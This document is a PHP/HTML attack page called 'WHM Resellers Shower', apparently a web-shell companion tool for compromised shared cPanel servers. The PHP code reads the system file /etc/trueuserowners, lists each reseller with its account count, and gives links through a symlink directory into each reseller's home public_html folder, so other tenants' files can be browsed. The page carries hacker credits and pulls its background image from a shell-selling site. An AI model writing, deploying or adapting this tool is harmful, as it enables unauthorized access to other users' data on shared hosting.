<html>

<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>WHM Resellers Finder - coded by: ~Sajjad Dahri</title>
<meta name="keywords" content="WHM Resellers Shower ~Abo Al-EoS DZ Quake Team aDriv4">
<meta name="description" content="WHM Resellers Finder - coded by: ~Sajjad Dahri">
</head>

<body bgcolor="#000000" style="text-align: center">

<p><font size="7" color="#808000">WHM Resellers Shower V.1</font></p>

<p>&nbsp;</p>
<center>
<table border="1" width="50%" cellspacing="0" cellpadding="15" style="border-width: 0px">
		<tr>
			<td background="http://buyshellsites.com/bg.gif" style="border-style: none; border-width: medium">
<div align="center">




<table border="1" width="100%" bgcolor="#000000" cellpadding="0" style="border-collapse: collapse" bordercolor="#333333">
	<tr>
		
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FF0000">Reseller</font></td>
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FF0000">Accounts</font></td>
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FF0000">Symlink</font></td>
		
	</tr>
</table>


<BR>











<?php

## grabs resellerss file
$lines = file("/etc/trueuserowners");


## split pure resellers's names
for ($i = 0; $i < count($lines); $i++) {
$values2 = split(': ', $lines[$i]);
$resellers[$i] = $values2['1'];
}

## remove duplicated resellerss and empty values
$resellers = array_unique($resellers);
$resellers = array_filter($resellers);

foreach($resellers as $reseller){
	$count = 0;
for ($i = 0; $i < count($lines); $i++) {
	
	if (strpos($lines[$i], ": $reseller") ) {
    $count = $count+1;
}
	
}

print '<table border="1" width="100%" bgcolor="#333333" cellpadding="0" style="border-collapse: collapse" bordercolor="#000000">
	<tr>
		
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FFFF00">'.$reseller.'</font></td>
		<td width="100" align="center">
		<font face="Courier New" size="2" color="#FFFF00">'.$count.'</font></td>
		<td width="100" align="center">
		<a href="./sym1/root/home/'.$reseller.'/public_html/" target="_blank"><font face="Courier New" size="2" color="#FFFF00">Symlink</font></td>

	</tr>
</table>



<BR>';
}

?> 

















</table>
</center>
<p>&nbsp;</p>
<p><font size="1" color="#FFFFFF">c0ded by: </font>
<font size="1" color="#FF0000">~Sajjad Dahri~</font></p>



</body>

</html>